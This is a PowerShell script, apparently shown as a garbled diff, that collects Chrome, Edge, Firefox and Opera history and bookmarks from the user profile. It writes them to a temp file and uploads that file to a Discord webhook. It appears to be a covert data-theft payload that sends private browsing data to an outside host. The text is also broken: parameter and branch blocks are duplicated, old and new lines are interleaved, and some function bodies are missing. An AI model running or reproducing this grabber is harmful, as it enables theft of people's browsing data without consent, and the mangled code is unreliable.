function Get-BrowserData {

    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$DataType 
    ) 

    Write-Host "Getting data for $Browser $DataType..."

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
@@ -29,22 +38,26 @@ function Get-BrowserData {
                Data = $_
            }
        }
    } 
    }
}

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
$BrowserData = ""

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
$BrowserData += "Chrome History:`n"
Get-BrowserData -Browser "chrome" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
$BrowserData += "Chrome Bookmarks:`n"
Get-BrowserData -Browser "chrome" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
$BrowserData += "Edge History:`n"
Get-BrowserData -Browser "edge" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
$BrowserData += "Edge Bookmarks:`n"
Get-BrowserData -Browser "edge" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }

Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
$BrowserData += "Firefox History:`n"
Get-BrowserData -Browser "firefox" -DataType "history"

Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt

function Upload-Discord {

@@ -80,4 +93,4 @@ function Upload-Discord {
    if (-not ([string]::IsNullOrEmpty($dc))){
        Upload-Discord -file "$env:TMP/--BrowserData.txt" -text "Browser data"
    }
